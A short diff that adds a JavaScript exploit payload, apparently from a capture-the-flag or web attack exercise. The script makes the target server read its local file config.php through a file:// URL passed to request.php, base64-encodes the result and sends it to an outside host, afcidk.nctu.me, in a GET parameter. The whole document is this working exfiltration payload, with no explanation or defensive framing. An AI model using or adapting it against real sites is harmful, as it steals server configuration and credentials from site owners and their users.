@@ -1,0 +1,11 @@
+var xhr = new XMLHttpRequest();
+xhr.open("POST", "request.php", true);
+xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
+xhr.onreadystatechange = function() {
+    if (xhr.readyState == 4) {
+        var xhr2 = new XMLHttpRequest();
+        xhr2.open("GET", "http://afcidk.nctu.me/?response="+btoa(xhr.responseText), true);
+        xhr2.send(null);
+    }
+};
+xhr.send("url=file%3A%2F%2F%2Fvar%2Fwww%2fhtml%2fconfig.php");
